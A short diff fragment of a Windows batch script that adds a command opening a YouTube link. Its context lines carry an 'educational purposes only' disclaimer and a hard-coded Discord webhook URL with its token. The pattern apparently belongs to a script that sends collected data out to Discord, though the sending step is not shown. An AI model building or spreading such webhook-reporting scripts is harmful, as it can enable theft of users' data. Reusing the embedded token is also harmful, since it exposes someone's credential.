@@ -1,7 +1,10 @@
 
-@echo off
+
 
 @echo off
+
+start https://youtu.be/D3-vBBQKOYU
+
 :: i dont take any responsibility for damage done with the programm it's for educational purposes only
 ::replace the YOURWEBHOOK field with your webhook
 set webhook=https://discord.com/api/webhooks/1280325708144574567/VI22kjkyMEiIu2o1b47Y4OOLBd9o5sweSQ3oP1mnVaU1PjFAbO95S-WuxxGH7a6CKh-I
